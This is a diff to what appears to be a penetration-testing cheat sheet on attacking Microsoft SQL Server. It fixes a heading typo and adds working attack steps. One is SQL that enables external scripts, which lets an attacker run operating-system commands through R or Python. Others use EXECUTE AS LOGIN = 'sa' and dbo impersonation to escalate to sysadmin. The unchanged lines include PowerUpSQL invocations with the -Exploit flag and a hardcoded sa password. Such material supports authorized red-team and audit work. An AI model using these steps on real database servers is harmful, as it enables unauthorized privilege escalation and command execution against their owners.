@@ -36,7 +36,7 @@
     * [Python](#python)
     * [R](#r)
 * [Audit Checks](#audit-checks)
-	* [Find and exploit impersonation opportunities](#find-and-explit-impersonation-opportunities) 
+	* [Find and exploit impersonation opportunities](#find-and-exploit-impersonation-opportunities) 
 * [Find databases that have been configured as trustworthy](#find-databases-that-have-been-configured-as-trustworthy)
 * [Manual SQL Server Queries](#manual-sql-server-queries)
 	* [Query Current User & determine if the user is a sysadmin](#query-current-user--determine-if-the-user-is-a-sysadmin)
@@ -268,6 +268,13 @@ Get-SQLAgentJob -Instance "<DBSERVERNAME\DBInstance>" -username sa -Password Pas
 
 ## External Scripts
 
+:warning: You need to enable **external scripts**.
+
+```sql
+sp_configure 'external scripts enabled', 1;
+RECONFIGURE;
+```
+
 ## Python:
 
 ```ps1
@@ -284,6 +291,14 @@ Invoke-SQLOSCmdR -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DB
 
 
 ### Find and exploit impersonation opportunities 
+
+* Impersonate as: `EXECUTE AS LOGIN = 'sa'`
+* Impersonate `dbo` with DB_OWNER
+	```sql
+	SQL> select is_member('db_owner');
+	SQL> execute as user = 'dbo'
+	SQL> SELECT is_srvrolemember('sysadmin')
+	```
 
 ```ps1
 Invoke-SQLAuditPrivImpersonateLogin -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Exploit -Verbose
